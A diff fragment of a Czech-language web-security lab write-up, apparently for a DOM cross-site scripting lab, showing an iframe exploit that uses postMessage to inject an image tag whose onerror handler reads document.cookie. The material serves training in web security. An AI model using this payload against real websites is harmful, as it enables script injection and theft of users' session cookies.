@@ -17,10 +17,13 @@ Aplikace přicházející zprávu zpracovala a nebezpečným způsobem ji vloži
 
 1. **Otevření Exploit serveru:** V laboratoři jsem přešel na přidělený Exploit server.
 2. **Vložení payloadu do Body:** Do pole **Body** jsem zapsal exploit využívající HTML tag `iframe` a funkci `postMessage`:
+
+
    ```html
    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
 onload="this.contentWindow.postMessage('<img src=1
 onerror=alert(document.cookie)>','*')">
+
 
 Uložení (Store): Nastavení jsem uložil kliknutím na tlačítko Store[cite: 5].
 
